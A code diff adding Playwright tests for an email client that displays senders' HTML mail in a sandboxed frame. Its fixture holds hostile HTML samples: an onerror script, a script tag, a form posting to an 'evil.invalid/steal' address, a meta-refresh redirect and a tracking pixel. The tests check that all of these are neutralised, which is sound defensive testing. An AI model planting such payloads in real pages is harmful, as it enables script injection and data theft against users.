@@ -645,6 +645,8 @@ def test_a_long_html_mail_reads_in_full_in_the_message_pane(page_factory, ui):
 
     page, errors, _ = page_factory()
     page.goto(page.url.split("#")[0] + "#/mail?id=" + "%3Clonghtml%40acme.example%3E")
+    # An HTML mail opens as it was sent; what Bmail read from it is beside that.
+    page.get_by_role("button", name="Text", exact=True).click()
     body = page.wait_for_selector(".reader .body-text")
     text = body.inner_text()
     assert "Point 39" in text and "• a copy of your CV" in text
@@ -717,5 +719,197 @@ def test_setup_says_which_version_this_is_and_where_its_update_stands(page_facto
     # Offline: it says so, and offers to try again.
     page.evaluate("bmailShell({version: '0.2.0', updates: 'error'})")
     assert "Try again" in page.locator("#about-bmail").inner_text()
+    assert not errors
+    page.close()
+
+
+RICH = (
+    "<html><head><title>Alert</title><style>.pre{display:none}</style></head>"
+    "<body style='background:#f3f2ef'><div class='pre'>preheader</div>"
+    "<table width='560' style='background:#fff'><tr><td>"
+    "<h1 id='headline'>Your job alert for <b>Android Developer</b></h1>"
+    "<img id='logo' src='cid:logo1' width='48' height='48' alt='Findwell'>"
+    "<meta name='referrer' content='unsafe-url'>"
+    "<img id='remote' referrerpolicy='unsafe-url' src='https://tracker.invalid/open.gif?u=42' alt='Bell'>"
+    "<a id='cta' href='https://jobs.example/all' style='background:#0a66c2;color:#fff'>See all jobs</a>"
+    "<img src='x' onerror=\"alert('img')\"><script>alert('script'); document.title='ran'</script>"
+    "<form action='https://evil.invalid/steal'><input name='q'><button>Go</button></form>"
+    "<meta http-equiv='refresh' content='0;url=https://evil.invalid/'>"
+    "</td></tr></table></body></html>"
+)
+
+
+def _rich_message():
+    from email.message import EmailMessage
+
+    from bmail.ingest.raw import parse_message
+
+    mail = EmailMessage()
+    mail["From"] = "JobBoard <jobalerts-noreply@jobboard.example>"
+    mail["To"] = "you@example.com"
+    mail["Subject"] = "Laid out: a job alert"
+    mail["Date"] = "Wed, 07 Oct 2026 13:28:00 +0200"
+    mail["Message-ID"] = "<laid-out@jobboard.example>"
+    mail.set_content("Your job alert for Android Developer")
+    mail.add_alternative(RICH, subtype="html")
+    png = (b"\x89PNG\r\n\x1a\n" + b"\x00" * 40)          # the bytes only have to travel
+    mail.get_payload()[1].add_related(png, "image", "png", cid="<logo1>")
+    return parse_message(bytes(mail), own_addresses={"you@example.com"})
+
+
+INSIDE = """(body) => {
+  const doc = document.querySelector('iframe.mail-frame').contentDocument;
+  return new Function('doc', body)(doc);
+}"""
+
+
+def _inside(page, body: str):
+    """Run `body` against the message's document, from the page around it.
+
+    Not through the frame itself: nothing may run in there, the test's own
+    probes included, and the browser says so in the console each time one tries.
+    """
+    return page.evaluate(INSIDE, body)
+
+
+def test_a_message_is_shown_as_it_was_laid_out_and_can_do_nothing(page_factory, ui):
+    """The reader showed forty lines of text for a mail that is a list of jobs
+    with logos and a button. It now shows the sender's own layout, which is
+    someone else's HTML: nothing in it may run, post, redirect or open a window."""
+    _base, app, config = ui
+    conn = connect(config.database)
+    try:
+        repo.bulk_upsert(conn, [_rich_message()])
+        conn.commit()
+    finally:
+        conn.close()
+
+    page, errors, _config = page_factory()
+    dialogs: list[str] = []
+    requested: list[str] = []
+    tracked: list = []
+    opened: list[str] = []
+    page.on("dialog", lambda dialog: (dialogs.append(dialog.message), dialog.dismiss()))
+    page.on("request", lambda request: (requested.append(request.url), tracked.append(request)))
+
+    def answer(route):
+        opened.append(route.request.post_data_json["url"])
+        route.fulfill(json={"ok": True})
+
+    page.route("**/api/open", answer)      # the engine would open a real browser
+    page.evaluate("localStorage.setItem('bmail.pictures', 'ask')")
+    page.goto(page.url.split("#")[0] + "#/mail?id=%3Claid-out%40jobboard.example%3E")
+    page.wait_for_selector("iframe.mail-frame.fitted")
+
+    assert "Android Developer" in _inside(page, "return doc.getElementById('headline').innerText")
+    assert _inside(page, "return getComputedStyle(doc.getElementById('cta')).backgroundColor") \
+        == "rgb(10, 102, 194)"
+    assert _inside(page, "return getComputedStyle(doc.querySelector('.pre')).display") == "none", \
+        "the sender's own stylesheet applies"
+    # The picture the message carried is in it; the one it would fetch is not asked for.
+    assert _inside(page, "return doc.getElementById('logo').getAttribute('src')").startswith(
+        "data:image/png;base64,")
+    assert _inside(page, "return doc.getElementById('remote').getAttribute('src')") is None
+    assert not [url for url in requested if "invalid" in url], requested
+    # Nothing in it ran, and nothing in it is left that could.
+    assert dialogs == []
+    assert _inside(page, "return doc.querySelectorAll('script, form, meta[http-equiv], [onerror]').length") == 0
+    assert page.title() != "ran"
+    assert page.locator("iframe.mail-frame").get_attribute("sandbox") == "allow-same-origin", \
+        "no scripts, no forms, no windows"
+
+    # It is part of the page: as tall as the message, with no scrollbar of its own.
+    sizes = page.evaluate("""() => {
+      const frame = document.querySelector('iframe.mail-frame');
+      const root = frame.contentDocument.documentElement;
+      return { frame: frame.offsetHeight, content: Math.ceil(root.getBoundingClientRect().height),
+               scrolls: root.scrollHeight > root.clientHeight + 1 };
+    }""")
+    # Up to a scrollbar taller: a message wider than the pane scrolls sideways.
+    assert 0 <= sizes["frame"] - sizes["content"] <= 20, sizes
+    assert not sizes["scrolls"], sizes
+
+    # A link opens in the person's own browser, never inside the reader.
+    _inside(page, "doc.getElementById('cta').click()")
+    for _ in range(100):
+        if opened:
+            break
+        page.wait_for_timeout(50)
+    assert opened == ["https://jobs.example/all"]
+    assert "laid-out" in page.url, "the message is still the one being read"
+    assert "Android Developer" in _inside(page, "return doc.getElementById('headline').innerText")
+
+    # Pictures only when asked for, for someone who chose to be asked.
+    assert page.locator(".reader-note").is_visible()
+    page.get_by_role("button", name="Show pictures").click()
+    page.wait_for_function("""() => {
+      const frame = document.querySelector('iframe.mail-frame');
+      const remote = frame.dataset.pictures === '1' && frame.contentDocument
+        && frame.contentDocument.getElementById('remote');
+      return Boolean(remote && (remote.getAttribute('src') || '').startsWith('https://tracker.invalid'));
+    }""", timeout=10000)
+    assert page.locator(".reader-note").is_hidden()
+    # The picture's host learns that it was asked, and nothing about who asked:
+    # no session key in the frame's address, and no address sent along at all.
+    assert app.token not in page.locator("iframe.mail-frame").get_attribute("src")
+    asked = [r for r in tracked if "tracker.invalid" in r.url]
+    assert asked, "the remote picture was asked for"
+    assert all("referer" not in r.headers for r in asked), [r.headers for r in asked]
+
+    # The text Bmail read is one click away.
+    page.get_by_role("button", name="Text", exact=True).click()
+    assert page.locator(".reader .body-text").is_visible()
+    assert page.locator("iframe.mail-frame").is_hidden()
+    # The frame's policy refusing something the message tried is the policy
+    # working; so is a picture host that does not exist. Anything else is ours.
+    expected = ("Content Security Policy", "tracker.invalid", "ERR_NAME_NOT_RESOLVED")
+    assert not [e for e in errors if not any(text in e for text in expected)], errors
+    page.evaluate("localStorage.removeItem('bmail.pictures')")
+    page.close()
+
+
+def test_pictures_show_unless_someone_chose_to_be_asked(page_factory, ui):
+    """Without its pictures a message is not the message, and most people never
+    ask for them. Being asked first is a choice, made once in Setup."""
+    _base, _app, config = ui
+    conn = connect(config.database)
+    try:
+        repo.bulk_upsert(conn, [_rich_message()])
+        conn.commit()
+    finally:
+        conn.close()
+    page, _errors, _config = page_factory()
+    page.evaluate("localStorage.removeItem('bmail.pictures')")
+    page.goto(page.url.split("#")[0] + "#/mail?id=%3Claid-out%40jobboard.example%3E")
+    page.wait_for_selector("iframe.mail-frame.fitted")
+    assert page.locator("iframe.mail-frame").get_attribute("data-pictures") == "1"
+    assert page.locator(".reader-note").is_hidden()
+
+    page.click('#nav a[data-tab="setup"]')
+    group = page.get_by_role("group", name="Pictures in mail")
+    assert group.get_by_role("button", name="Show", exact=True).get_attribute("aria-pressed") == "true"
+    group.get_by_role("button", name="Ask first").click()
+    assert page.evaluate("localStorage.getItem('bmail.pictures')") == "ask"
+    group.get_by_role("button", name="Show", exact=True).click()
+    assert page.evaluate("localStorage.getItem('bmail.pictures')") == "always"
+    page.close()
+
+
+def test_mail_read_before_layouts_were_kept_says_so(page_factory, ui):
+    _base, _app, config = ui
+    conn = connect(config.database)
+    try:
+        message = _rich_message().model_copy(update={
+            "message_id": "<before-layouts@jobboard.example>", "body_html": ""})
+        repo.bulk_upsert(conn, [message])
+        conn.commit()
+    finally:
+        conn.close()
+    page, errors, _config = page_factory()
+    page.goto(page.url.split("#")[0] + "#/mail?id=%3Cbefore-layouts%40jobboard.example%3E")
+    page.wait_for_selector(".reader .body-text")
+    assert page.locator("iframe.mail-frame").count() == 0
+    assert "before it kept the original layout" in page.inner_text(".reader-note")
+    assert page.get_by_role("button", name="Read my mail again").is_visible()
     assert not errors
     page.close()
